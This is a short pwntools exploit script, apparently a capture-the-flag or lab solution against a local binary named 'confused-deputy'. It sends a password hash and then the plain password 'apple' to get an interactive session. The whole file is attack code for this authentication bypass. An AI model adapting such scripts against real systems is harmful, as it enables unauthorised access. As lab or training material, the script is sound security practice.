from pwn import *
from Crypto.Hash import SHA256


target = "../../../confused-deputy/confused-deputy"
p = process(target)

p.recvuntil(':')
p.sendline("passwd")
h = SHA256.new('apple')
p.sendline(h.hexdigest())

p = process(target)
p.sendline("passwd")
p.sendline("apple")
p.interactive()